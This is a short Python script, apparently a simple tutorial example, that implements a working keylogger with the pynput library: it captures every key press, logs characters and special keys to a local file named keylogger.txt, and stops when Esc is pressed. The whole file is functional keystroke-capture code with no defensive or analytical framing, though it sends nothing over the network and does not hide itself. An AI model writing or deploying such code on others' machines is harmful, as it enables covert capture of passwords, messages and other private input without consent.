# Import necessary modules
from pynput import keyboard

# Function to write keystrokes to a local text file
def write(text):
    with open("keylogger.txt", 'a') as f:
        f.write(text)
        f.close()

# Function to handle key press events
def on_key_press(Key):
    try:
        if Key == keyboard.Key.enter:
            write("\n")                   # Add a new line when "Enter" is pressed
        else:
            write(Key.char)               # Write character keys directly
    except AttributeError:
        # Handle special keys
        if Key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif Key == keyboard.Key.tab:
            write("\nTab Pressed\n")
        elif Key == keyboard.Key.space:
            write(" ")                    # Add a space for the "Space" key
        else:
            temp = repr(Key) + " Pressed.\n"
            write(temp)
            print("\n{} Pressed\n".format(Key))

# Function to handle key release events
def on_key_release(Key):
    # Stops the keylogger when "Esc" is pressed
    if Key == keyboard.Key.esc:
        return False

# Start the keyboard listener
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()
